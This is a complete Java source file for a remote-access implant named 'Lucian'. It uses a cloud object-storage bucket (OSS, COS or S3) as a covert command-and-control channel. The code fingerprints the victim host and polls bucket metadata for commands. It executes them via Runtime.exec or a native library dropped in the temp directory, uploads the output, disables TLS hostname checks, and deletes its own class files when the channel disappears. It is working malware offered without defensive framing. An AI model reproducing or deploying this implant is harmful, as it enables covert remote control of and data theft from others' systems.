import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLSession;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Random;
import java.util.Scanner;
import java.util.TimeZone;
import java.util.UUID;


public class Lucian {


    private static String type = "OSS";

    private static String endpoint = "https://xxx.oss-cn-hangzhou.aliyuncs.com/";

    private static String bucketname = "/";

    private static String path = "/";

    private static String accessKeyId = "";

    private static String accessKeySecret = "";

    private static boolean debug_mode = true;

    private static boolean idle = true;

    private static boolean silent = false;

    private static boolean persist = false;

    private static boolean lucian = true;

    private static final String UID = String.valueOf(UUID.randomUUID());

    private static Object obj = "";

    private static URL OSSObjectURL = null;

    private static String meta = "";


    public native static String gccjvm(String string);

    public static void main(String[] args) {
        try {


            new Lucian().lucian();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void init() {
        try {

            String jnilib = System.getProperty("java.io.tmpdir") + "/falconlib.so";
            if (System.getProperty("java.version").contains("1.8.") && "64".equals(System.getProperty("sun.arch.data.model")) && !jnilib.isEmpty() && System.getProperty("os.name").toLowerCase().contains("linux")) {
                File dllFile = new File(jnilib);
                if (dllFile.exists()) {
                    try {
                        System.load(jnilib);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }

            String hostname = "";
            try {
                hostname = InetAddress.getLocalHost().getHostName();
            } catch (UnknownHostException e) {
                hostname = "hosterror";
            }
            String platform = System.getProperty("os.name");
            String username = System.getProperty("user.name");

            meta = enCode64((platform + "|" + username + "|" + hostname));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void lucian()
            throws Exception {

        Lucian.init();
        if (bucketname.isEmpty() || endpoint.isEmpty() || type.isEmpty()) {
            System.exit(1);
        }

        if (
                (endpoint.startsWith("https"))) {
            OSSObjectURL = new URL(endpoint + bucketname + path + UID);
        } else {
            OSSObjectURL = new URL("http://" + bucketname + "." + endpoint.substring(7) + path + UID);
        }
        runLucian();
    }

    private static void runLucian() {
        try {

            String last = "";
            for (; ; ) {


                if (lucian) {
                    lucian = false;
                    send("", "", "PUT");
                }
                String cmdline = send("", "", "HEAD");
                if (cmdline == null) {
                    continue;
                }
                if ((!"".equals(cmdline)) && (!last.equals(cmdline))) {
                    try {

                        if (cmdline.startsWith("#")) {
                            String res = gccjvm(cmdline.substring(1, cmdline.length()));
                            send(res, cmdline, "PUT");

                        } else {
                            Scanner s = new Scanner(Runtime.getRuntime().exec(cmdline).getInputStream()).useDelimiter(
                                    "\\A");
                            send(s.hasNext() ? s.next() : "", cmdline, "PUT");
                        }

                    } catch (Exception e) {
                        send(e.getLocalizedMessage(), cmdline, "PUT");
                    }
                    last = cmdline;
                }
                Thread.sleep(new Random().nextInt(10) * 1 * 1000);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String send(String obj, String cmdline, String method) {
        BufferedReader bf = null;
        InputStream is = null;
        OutputStream os = null;
        HttpURLConnection connection = null;
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutput out = new ObjectOutputStream(bos);

            out.writeObject("|" + cmdline + "|" + System.lineSeparator() + obj);
            if (OSSObjectURL.getProtocol().toLowerCase().startsWith("https")) {
                HttpsURLConnection httpsURLConnection = (HttpsURLConnection) OSSObjectURL.openConnection();
                httpsURLConnection.setHostnameVerifier(new HostnameVerifier() {
                    @Override
                    public boolean verify(String hostname, SSLSession session) {
                        return true;
                    }
                });
                connection = httpsURLConnection;
            } else {
                connection = (HttpURLConnection) OSSObjectURL.openConnection();
            }
            connection.setRequestMethod(method);
            connection.setDoOutput(true);
            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Content-Type", "application/octet-stream");
            connection.setRequestProperty("Content-Length", obj.toString().getBytes().length + "");
            SimpleDateFormat sdf = new SimpleDateFormat("EEE, dd MMM yyyy HH:mm:ss 'GMT'", Locale.US);
            sdf.setTimeZone(TimeZone.getTimeZone("GMT"));
            connection.setRequestProperty("Date", sdf.format(new Date()));
            connection.setRequestProperty("Expect", "100-continue");
            String cmdSign = "";
            String toSign;
            if (("PUT".equals(method)) && ("OSS".equals(type))) {
                connection.setRequestProperty("x-oss-meta-info", meta);
                connection.setRequestProperty("x-oss-meta-cmd", cmdline);

                cmdSign = "x-oss-meta-cmd:" + cmdline.trim() + "\n";

                toSign = "" + method + "\n\napplication/octet-stream\n" + sdf.format(new Date()) + "\n"
                        + cmdSign + "x-oss-meta-info:" + meta.trim() + "\n/" + bucketname + path + UID;

                byte[] hm = hamcsha1(toSign.getBytes(), accessKeySecret.getBytes());
                if (!accessKeyId.isEmpty() && !accessKeySecret.isEmpty()) {
                    connection.setRequestProperty("Authorization", "OSS " + accessKeyId + ":" +
                            enCode64(new String(hm)));
                }

                os = connection.getOutputStream();
                os.write(bos.toByteArray());
            } else if (("PUT".equals(method)) && ("COS".equals(type))) {
                connection.setRequestProperty("x-cos-meta-info", meta);
                connection.setRequestProperty("x-cos-meta-cmd", cmdline);
                os = connection.getOutputStream();
                os.write(bos.toByteArray());
            } else if (("PUT".equals(method)) && ("S3".equals(type))) {
                connection.setRequestProperty("x-amz-meta-info", meta);
                connection.setRequestProperty("x-amz-meta-cmd", cmdline);
                connection.setRequestMethod(method);
                cmdSign = "x-amz-meta-cmd:" + cmdline.trim() + "\n";

                toSign = "" + method + "\n\napplication/octet-stream\n" + sdf.format(new Date()) + "\n"
                        + cmdSign + "x-amz-meta-info:" + meta.trim() + "\n/" + bucketname + "" + path + ""
                        + UID;

                byte[] hm = hamcsha1(toSign.getBytes(), accessKeySecret.getBytes());
                connection.setRequestProperty("Authorization", "AWS " + accessKeyId + ":" +
                        enCode64(new String(hm)));
                os = connection.getOutputStream();
                os.write(bos.toByteArray());
            } else if (("HEAD".equals(method)) && ("OSS".equals(type))) {
                connection.setRequestProperty("x-oss-meta-info", meta);
                connection.setRequestProperty("x-oss-meta-cmd", cmdline);

                toSign = "" + method + "\n\napplication/octet-stream\n" + sdf.format(new Date())
                        + "\nx-oss-meta-cmd:\nx-oss-meta-info:" + meta.trim() + "\n/" + bucketname + path + UID;

                byte[] hm = hamcsha1(toSign.getBytes(), accessKeySecret.getBytes());

                if (!accessKeyId.isEmpty() && !accessKeySecret.isEmpty()) {
                    connection.setRequestProperty("Authorization", "OSS " + accessKeyId + ":" +
                            enCode64(new String(hm)));
                }

            } else if ((!"HEAD".equals(method)) || (!"COS".equals(type))) {
                if (("HEAD".equals(method)) && ("S3".equals(type))) {
                    connection.setRequestProperty("x-amz-meta-info", meta);
                    connection.setRequestProperty("x-amz-meta-cmd", cmdline);

                    toSign = "" + method + "\n\napplication/octet-stream\n" + sdf.format(new Date())
                            + "\nx-amz-meta-cmd:\nx-amz-meta-info:" + meta.trim() + "\n/" + bucketname + ""
                            + path + "" + UID;

                    byte[] hm = hamcsha1(toSign.getBytes(), accessKeySecret.getBytes());
                    connection.setRequestProperty("Authorization", "AWS " + accessKeyId + ":" +
                            enCode64(new String(hm)));
                }
            }
            connection.connect();
            if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                if ("OSS".equals(type)) {
                    return connection.getHeaderField("x-oss-meta-cmd");
                }
                if ("COS".equals(type)) {
                    return connection.getHeaderField("x-cos-meta-cmd");
                }
                if ("S3".equals(type)) {
                    return connection.getHeaderField("x-amz-meta-cmd");
                }
            } else if (connection.getResponseCode() == HttpsURLConnection.HTTP_NOT_FOUND || connection.getResponseCode() == HttpsURLConnection.HTTP_BAD_REQUEST) {
                selfDestory();
                System.exit(1);
            } else {
                System.out.println(connection.getResponseMessage() + connection.getResponseCode());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (null != bf) {
                try {
                    bf.close();
                } catch (IOException e) {
                }
            }
            if (null != is) {
                try {
                    is.close();
                } catch (IOException e) {
                }
            }
            if (null != os) {
                try {
                    os.close();
                } catch (IOException e) {
                }
            }
            connection.disconnect();
        }
        return "";
    }


    public static byte[] hamcsha1(byte[] data, byte[] key) {
        try {
            SecretKeySpec signingKey = new SecretKeySpec(key, "HmacSHA1");
            Mac mac = Mac.getInstance("HmacSHA1");
            mac.init(signingKey);
            return mac.doFinal(data);
        } catch (Exception localException) {
        }
        return null;
    }


    private static final char[] baseChars = {
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
            'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
            'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
            'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/',
    };

    public static String enCode64(String s) {
        int index = 0;
        StringBuilder strBuff = new StringBuilder();
        StringBuilder resultBuff = new StringBuilder();
        while (true) {

            if (index == -1) {
                switch (s.length() * 8 % 6) {
                    case 2:
                        resultBuff.append('=').append('=');
                        break;
                    case 4:
                        resultBuff.append('=');
                        break;
                }
                break;
            }

            if (index >= s.length()) {
                int zeroCount = 6 - strBuff.length();
                for (int i = 0; i < zeroCount; i++) {
                    strBuff.append('0');
                }
                index = -1;
            }

            if (strBuff.length() < 6) {
                strBuff.append(getBitStr(s.charAt(index++)));
            }

            String temp2 = strBuff.substring(0, 6);
            int temp10 = Integer.parseInt(temp2, 2);
            resultBuff.append(baseChars[temp10]);
            strBuff.delete(0, 6);
        }
        return resultBuff.toString();
    }


    public static String getBitStr(char i) {
        int ascii = (int) i;

        StringBuilder s = new StringBuilder(Integer.toBinaryString(ascii));
        if (s.length() < 8) {
            int zeroCount = 8 - s.length();
            for (int j = 0; j < zeroCount; j++) {
                s.insert(0, '0');
            }
        }
        return s.toString();
    }

    public static void selfDestory() {

        File dir = new File(Thread.currentThread().getContextClassLoader().getResource("").getPath());

        if (dir.isDirectory() && dir.exists()) {
            for (File f : dir.listFiles()
            ) {
                if (f.getName().contains("Lucian") || f.getName().contains("Senna")) {
                    f.deleteOnExit();
                }
            }
        }

    }

}
